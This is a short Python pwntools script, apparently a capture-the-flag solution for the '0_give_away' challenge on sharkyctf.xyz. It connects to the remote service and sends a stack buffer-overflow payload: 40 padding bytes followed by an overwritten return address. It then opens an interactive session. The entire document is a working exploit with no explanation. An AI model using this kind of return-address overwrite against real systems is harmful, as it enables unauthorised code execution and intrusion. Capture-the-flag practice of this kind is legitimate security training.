from pwn import *

#p=process("./0_give_away")
p=remote("sharkyctf.xyz",20333)
pause()
offset=40
payload = 'A'*offset
payload += p64(0x4006a7)

p.sendline(payload)

p.interactive()